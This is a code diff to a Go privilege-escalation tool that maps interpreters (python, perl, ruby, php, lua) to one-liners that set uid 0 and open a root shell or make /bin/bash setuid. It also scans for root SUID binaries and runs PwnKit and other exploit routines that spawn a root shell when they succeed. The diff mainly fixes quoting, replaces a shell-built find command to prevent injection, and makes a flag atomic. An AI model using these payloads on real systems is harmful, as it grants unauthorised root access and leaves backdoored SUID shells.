@@ -6,7 +6,6 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
-	"syscall"
 	"time"
 )
 
@@ -44,7 +43,7 @@ var GTFOBINS = map[string]gtfobinsEntry{
 	"python":  {spawnCmd: "python -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
 	"python3": {spawnCmd: "python3 -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python3 -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
 	"python2": {spawnCmd: "python2 -c 'import os;os.setuid(0);os.setgid(0);os.system(\"/bin/bash -p\")'", suidCmd: "python2 -c 'import os;os.setuid(0);os.system(\"chmod +s /bin/bash\")'"},
-	"perl":    {spawnCmd: "perl -e 'exec \"/bin/bash\", \"-p\"", suidCmd: "perl -e 'exec \"sh\", \"-c\", \"chmod +s /bin/bash\"'"},
+	"perl":    {spawnCmd: "perl -e 'exec \"/bin/bash\", \"-p\"'", suidCmd: "perl -e 'exec \"sh\", \"-c\", \"chmod +s /bin/bash\"'"},
 	"ruby":    {spawnCmd: "ruby -e 'exec \"/bin/bash\", \"-p\"'", suidCmd: "ruby -e 'exec \"sh\", \"-c\", \"chmod +s /bin/bash\"'"},
 	"php":     {spawnCmd: "php -r 'pcntl_exec(\"/bin/bash\",[\"-p\"]);'", suidCmd: "php -r 'system(\"chmod +s /bin/bash\");'"},
 	"lua":     {spawnCmd: "lua -e 'os.execute(\"/bin/bash -p\")'", suidCmd: "lua -e 'os.execute(\"chmod +s /bin/bash\")'"},
@@ -156,11 +155,13 @@ func scanSUID() []string {
 		if _, err := os.Stat(d); err != nil {
 			continue
 		}
-		// find <dir> -maxdepth 4 -type f -perm -4000 -user root 2>/dev/null
-		// We run find via /bin/sh so we can redirect stderr to /dev/null,
-		// since exec.Command doesn't do shell redirection.
-		cmd := exec.Command("/bin/sh", "-c",
-			"find "+d+" -maxdepth 4 -type f -perm -4000 -user root 2>/dev/null")
+		// find <dir> -maxdepth 4 -type f -perm -4000 -user root
+		// Use exec.Command with real args (not /bin/sh -c with string
+		// concat) to avoid command-injection if dirs ever come from
+		// user input. stderr is discarded by Output() automatically.
+		cmd := exec.Command("find", d, "-maxdepth", "4", "-type", "f",
+			"-perm", "-4000", "-user", "root")
+		cmd.Stderr = nil // suppress permission-denied noise
 		out, err := cmd.Output()
 		_ = err
 		if len(out) == 0 {
@@ -329,7 +330,7 @@ void gconv_init(void *step) {
 	if r.rootAfter || r.suidAfter {
 		okf("PwnKit GCONV_PATH succeeded!")
 		if !*flagNoSpawn {
-			shellSpawned = rootspawn(&r)
+			shellSpawned.Store(rootspawn(&r))
 		}
 		*stop = true
 		return true
@@ -360,7 +361,7 @@ func tryGTFOBins(path string, e gtfobinsEntry, stop *bool) bool {
 		}
 		if r.rootAfter || r.suidAfter {
 			if !*flagNoSpawn {
-				shellSpawned = rootspawn(&r)
+				shellSpawned.Store(rootspawn(&r))
 			}
 			*stop = true
 			return true
@@ -376,7 +377,7 @@ func tryGTFOBins(path string, e gtfobinsEntry, stop *bool) bool {
 		}
 		if r.rootAfter || r.suidAfter {
 			if !*flagNoSpawn {
-				shellSpawned = rootspawn(&r)
+				shellSpawned.Store(rootspawn(&r))
 			}
 			*stop = true
 			return true
@@ -413,7 +414,7 @@ func tryCopyfailAgainst(s *systemInfo, suidPath string, stop *bool) bool {
 		r2.report()
 		if r2.rootAfter || r2.suidAfter {
 			if !*flagNoSpawn {
-				shellSpawned = rootspawn(&r2)
+				shellSpawned.Store(rootspawn(&r2))
 			}
 			*stop = true
 			return true
@@ -421,7 +422,7 @@ func tryCopyfailAgainst(s *systemInfo, suidPath string, stop *bool) bool {
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			shellSpawned = rootspawn(&r)
+			shellSpawned.Store(rootspawn(&r))
 		}
 		*stop = true
 		return true
@@ -434,6 +435,4 @@ func hasSuffixStr(s, suf string) bool {
 	return len(s) >= len(suf) && s[len(s)-len(suf):] == suf
 }
 
-// Ensure syscall is referenced (used by runIsolated in runner.go, but
-// keep the import honest in case this file is compiled standalone).
-var _ = syscall.SIGKILL
+
